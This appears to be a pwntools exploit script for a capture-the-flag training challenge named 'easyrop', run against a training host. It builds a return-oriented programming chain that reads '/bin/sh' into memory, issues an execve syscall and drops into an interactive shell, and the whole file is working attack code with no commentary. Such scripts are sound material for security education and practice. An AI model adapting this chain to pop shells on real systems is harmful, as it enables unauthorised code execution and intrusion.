from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    if "NORMAL" not in args:
        r = process("./easyrop")
        gdb.attach(r, """
        c
        """)
    else:
        r = process("./easyrop")    
else:
    r = remote("bin.training.offdef.it", 2015)


def halfonstack(value):
    r.send(p32(value))
    r.send(p32(0))

def onstack(value):
    onehalf = value & 0xffffffff
    otherhalf = value >> 32

    halfonstack(onehalf)
    halfonstack(otherhalf)

read = 0x400144
binsh = 0x600500

chain = [0x0]*7
chain += [
    0x00000000004001c2,
    0,
    binsh,
    8,
    0,
    read,
    0x00000000004001c2,
    binsh,
    0,
    0,
    0x3b,
    0x0000000000400168
]


for i in chain:
    onstack(i)

r.send(b"\n")
time.sleep(0.1)
r.send(b"\n")
time.sleep(0.1)

r.send(b"/bin/sh\x00")

r.interactive()